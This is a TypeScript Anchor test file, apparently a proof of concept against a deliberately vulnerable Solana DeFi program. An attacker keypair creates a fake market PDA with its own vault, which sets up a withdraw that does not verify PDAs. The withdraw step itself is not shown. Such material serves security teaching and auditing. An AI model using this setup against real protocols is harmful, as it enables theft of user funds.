import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { VulnerableDefiProtocol } from "../target/types/vulnerable_defi_protocol";
import { 
  createMint, getOrCreateAssociatedTokenAccount, mintTo, TOKEN_PROGRAM_ID
} from "@solana/spl-token";

// POC #6: No PDA Verification in Withdraw (setup illustrates fake market creation)

describe("POC #6 - No PDA Verification allows fake market swap", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.VulnerableDefiProtocol as Program<VulnerableDefiProtocol>;

  let admin: anchor.web3.Keypair;
  let attacker: anchor.web3.Keypair;
  let supplyMint: anchor.web3.PublicKey;
  let collateralMint: anchor.web3.PublicKey;
  let configKeypair: anchor.web3.Keypair;

  before(async () => {
    admin = anchor.web3.Keypair.generate();
    attacker = anchor.web3.Keypair.generate();
    const airdropAmount = 10 * anchor.web3.LAMPORTS_PER_SOL;
    for (const kp of [admin, attacker]) {
      await provider.connection.confirmTransaction(
        await provider.connection.requestAirdrop(kp.publicKey, airdropAmount)
      );
    }

    supplyMint = await createMint(provider.connection, admin, admin.publicKey, null, 6);
    collateralMint = await createMint(provider.connection, admin, admin.publicKey, null, 6);

    // Initialize config
    configKeypair = anchor.web3.Keypair.generate();
    await program.methods
      .initialize(admin.publicKey)
      .accounts({
        config: configKeypair.publicKey,
        signer: admin.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
      } as any)
      .signers([admin, configKeypair])
      .rpc();
  });

  it("Attacker creates fake market PDA (illustrative)", async () => {
    const oracle = anchor.web3.Keypair.generate();
    await program.methods
      .createOracle(new anchor.BN(1_000_000))
      .accounts({ oracle: oracle.publicKey, signer: admin.publicKey, systemProgram: anchor.web3.SystemProgram.programId } as any)
      .signers([admin, oracle])
      .rpc();

    const legitMarketId = new anchor.BN(5);
    const [legitMarketPDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("market"), legitMarketId.toArrayLike(Buffer, "le", 8), supplyMint.toBuffer(), collateralMint.toBuffer()],
      program.programId
    );

    const legitVaultAccount = await getOrCreateAssociatedTokenAccount(provider.connection, admin, supplyMint, legitMarketPDA, true);
    const legitVault = legitVaultAccount.address;

    await mintTo(provider.connection, admin, supplyMint, legitVault, admin.publicKey, 10_000_000);

    await program.methods
      .createMarket(legitMarketId)
      .accounts({
        market: legitMarketPDA,
        config: configKeypair.publicKey,
        supplyMint,
        collateralMint,
        supplyOracle: oracle.publicKey,
        collateralOracle: oracle.publicKey,
        vault: legitVault,
        authority: admin.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
      } as any)
      .signers([admin])
      .rpc();

    const fakeMarketId = new anchor.BN(999);
    const [fakeMarketPDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("market"), fakeMarketId.toArrayLike(Buffer, "le", 8), supplyMint.toBuffer(), collateralMint.toBuffer()],
      program.programId
    );

    const fakeVaultAccount = await getOrCreateAssociatedTokenAccount(provider.connection, attacker, supplyMint, fakeMarketPDA, true);
    const fakeVault = fakeVaultAccount.address;

    await program.methods
      .createMarket(fakeMarketId)
      .accounts({
        market: fakeMarketPDA,
        config: configKeypair.publicKey,
        supplyMint,
        collateralMint,
        supplyOracle: oracle.publicKey,
        collateralOracle: oracle.publicKey,
        vault: fakeVault,
        authority: attacker.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
      } as any)
      .signers([attacker])
      .rpc();

    // This illustrates existence of a fake market that could be swapped in withdraw without PDA verification
  });
});
